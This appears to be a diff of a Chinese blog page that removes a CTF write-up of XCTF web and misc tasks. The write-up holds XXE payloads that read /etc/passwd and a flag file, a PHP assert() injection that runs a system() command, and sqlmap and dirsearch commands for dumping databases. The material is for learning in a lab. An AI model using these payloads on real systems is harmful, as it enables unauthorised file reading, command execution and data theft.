-  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">"test101"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>  这段代码与上面的只有两行不一样</p>
-<ul>
-<li><p><code>&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</code></p>
-</li>
-<li><p><code>&lt;description&gt;&amp;xxe;&lt;/description&gt;</code><br>其中<code>&amp;xxe</code>就是恶意引用了外部的文件(实体):<code>file:///etc/passwd</code></p>
-<br>
-这份数据包如果发送给服务器, 代码被解释并返回
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;: &quot;no results for description root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync...&#125;</span><br></pre></td></tr></table></figure>
-
-<p>“无意”中就把文件的内容泄漏出来了.</p>
-<br>
-以上就是通过直接DTD外部实体声明实现的xxe. 理论上可以实现任意文件读取.
-
-<p>不过这一切的前提是, <strong>允许对外部实体的引用</strong></p>
-</li>
-</ul>
-</li>
-</ul>
-<p>好的, 前期知识基础的铺垫就先这么多.<br>回到刚才的题目上来, 我们查看下index.php的源代码, 有这么一段 js 代码</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr;</span><br><span class="line">        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line">                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> xhr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span><br><span class="line"> <span class="keyword">var</span> xhr = XHR();</span><br><span class="line">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line">     xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span><br><span class="line">             data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line">             tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line">             tip_area.value = data.task.search+data.task.value;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>emmm, 这段代码有太多我陌生的方法了, 全面的理解对解题来说性价比太低了.<br>不过如果能捕捉到其中的关键字<code>XML</code>我想对解题应该能起到一个很好的提示作用吧.<br>总之, 假设我们现在已经知道这道题目是有xxe漏洞的, 那么就可以用刚才的方法读取flag文件!<br><br><br>点击题目的那个<code>GO</code><br>用<code>Burp Suite</code>抓包. 发现是<code>POST</code>方法, body中有一段json格式的代码. 弃之.<br>我们要传xml的数据.<br>所以首先把<code>Content-Type</code>改成<code>application/xml</code><br>再在<code>body</code>中构造如下payload</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE abcd[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY any SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">something</span>&gt;</span>&amp;any;<span class="tag">&lt;/<span class="name">something</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>最终效果图 :<br><img src="http://whoisyourdaddy.cf/picture/xxe.png" alt><br>ojbk.</p>
-<p>###<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5002" target="_blank" rel="noopener">mfw</a>(resolved)</p>
-<p>在题目中看到了出题者使用了Git, 可以猜测是Source Leak, 使用GitHack脚本, 能下载部分源代码.<br><img src="http://whoisyourdaddy.cf/picture/GitHack.png" alt></p>
-<p>其实一开始以为要用目录扫描工具, 顺便记录下目录扫描的方法, 可以用Kali自带的<code>dirbuster</code>, 也可以用Github上的开源工具<code>dirsearch</code>.<br>这里推荐用后者, 因为它简单易用且十分强大.<br><strong>使用方法</strong> : <code>python dirsearch.py -u [URL] -e *</code></p>
-<p>言归正传<br>在下载下的目录中看到有个<code>\templates\flag.php</code>, 进去后写着TODO, 这其实给了我们提示, <strong>要想办法读取这个flag.php</strong>.</p>
-<p>再来审计index.php的代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br></pre></td></tr></table></figure>
-
-<p>直接上构造好的payload:<code>&#39;,&#39;yjn&#39;) or system(&#39;cat ./templates/flag.php&#39;);//</code></p>
-<p>把我们的payload代入进去:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$page = <span class="string">"','yjn') or system('cat ./templates/flag.php');//"</span>;</span><br><span class="line">$file = templates/<span class="string">','</span>yjn<span class="string">') or system('</span>cat ./templates/flag.php<span class="string">');//.php</span></span><br><span class="line"><span class="string">assert("strpos('</span>templates/<span class="string">','</span>yjn<span class="string">') or system('</span>cat ./templates/flag.php<span class="string">');//.php'</span>, <span class="string">'..'</span>) === <span class="keyword">false</span><span class="string">") or die("</span>Detected hacking attempt!<span class="string">");</span></span><br></pre></td></tr></table></figure>
-
-<p>值得注意的是, <code>//</code>在这里起到了注释的作用, 但是只注释到assert的括号内.<br>所以这条语句就成了</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(<span class="string">"strpos('templates/','yjn') or system('cat ./templates/flag.php');"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br></pre></td></tr></table></figure>
-
-<p>再把<code>assert()</code>去除掉</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strpos(<span class="string">'templates/'</span>,<span class="string">'yjn'</span>) <span class="keyword">or</span> </span><br><span class="line">system(<span class="string">'cat ./templates/flag.php'</span>) <span class="keyword">or</span> </span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br></pre></td></tr></table></figure>
-
-<p>这条语句由三个小语句组成, 并用<code>or</code>连接了起来, 依此编号 1 2 3.<br>那么, 为了得到flag, 我们希望执行<code>语句2</code>,而不希望执行其它语句.<br>所以这里其实是利用了<code>or</code>的<code>短路效应</code>.</p>
-<ul>
-<li><code>语句1</code> : <code>strpos()</code>函数为查找字串, 但是显然<code>templates/flag.php</code>中没有<code>yjn</code>这个子串, 所以会有个返回值0. <code>or</code>会继续往下执行.</li>
-<li><code>语句2</code> : 使系统执行命令<code>cat ./templates/flag.php</code>, 这条命令不光会让我们成功的拿到了flag, 还会返回<code>TRUE</code>, <code>or</code>就不会执行<code>语句3</code>. 如果命令执行不成功, 也会有个<code>FLASE</code>的返回值, 这曾一度给我很大的困扰.</li>
-</ul>
-<p>最终<br><img src="http://whoisyourdaddy.cf/picture/mfw.png" alt></p>
-<p>###<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4686" target="_blank" rel="noopener">NewCenter(solved)</a></p>
-<p>进入题目是个类似新闻网站的页面, 下面有个搜索框.<br>可以sql注入.<br>但是我现在的sql注入技术还是菜啊, 所以就用<code>sqlmap</code>吧, 记录下~</p>
-<p>因为<code>sqlmap</code>要求<code>python2</code>运行, 所以我这里是用的<code>Kali</code>下自带的</p>
-<p>首先把搜索的请求包抓取, 将其内容放进一个<code>txt</code>文件中</p>
-<p>使用命令<code>sqlmap   -r 1.txt --dbs</code><br>可以将表的名字列出, 发现有个<code>news</code><br>再使用命令<code>sqlmap   -r 1.txt -D news --dump</code><br>就能将这个表的内容全部显示出来<br>get flag~</p>
-<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ext3-solved"><a href="#ext3-solved" class="headerlink" title="ext3(solved)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=misc&number=1&grade=0&id=5098" target="_blank" rel="noopener">ext3(solved)</a></h3><ul>
-<li>重点 :<ul>
-<li>ext3 文件系统</li>
-<li>strings</li>
-<li>文件系统的挂载/卸载</li>
-</ul>
-</li>
-</ul>
-<p>附件是个名为<code>linux</code>的文件,<br>扔进 Linux 里,<code>file linux</code>.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux: Linux rev 1.0 ext3 filesystem data, UUID=cf6d7bff-c377-403f-84ae-956ce3c99aaa (needs journal recovery)</span><br></pre></td></tr></table></figure>
-
-<p>可以看出是Linux文件系统<code>ext3</code>, 我们要找的<code>flag</code>应该就藏在这个文件里</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@youjianing:~# string linux | grep &apos;flag&apos;</span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br><span class="line">~root/Desktop/file/O7avZhikgKgbF/flag.txt</span><br></pre></td></tr></table></figure>
-
-<p>但是要读取这个<code>flag.txt</code>,需要我们把文件系统挂载到Linux系统下.<br><code>mount linux /mnt</code><br>现在 <code>/mnt</code>目录就是挂载点.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@youjianing:~# cat /mnt/O7avZhikgKgbF/flag.txt</span><br><span class="line">ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=</span><br></pre></td></tr></table></figure>
-
-<p><code>base64</code> decode后就是flag<br>最后可以使用 <code>umount [挂载点]</code>来卸载文件系统.</p>
-<hr>
-<center><font size="2" color="grey">最后修改于 2019/6/28   
-
-<p>天津大学-智能与计算学部-尤嘉宁 </p>
-</font></center>
-        </div>
-    
-
-</div>
             
                 
 <div class="post">
@@ -494,10 +240,6 @@
     <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
         <h2>Recent Posts</h2>
         <ul>
-            
-            <li>
-                <a class="footer-post" href="/2019/07/07/CTF-writeup/">CTF writeup</a>
-            </li>
             
             <li>
                 <a class="footer-post" href="/2019/07/07/just-a-test/">just a test</a>
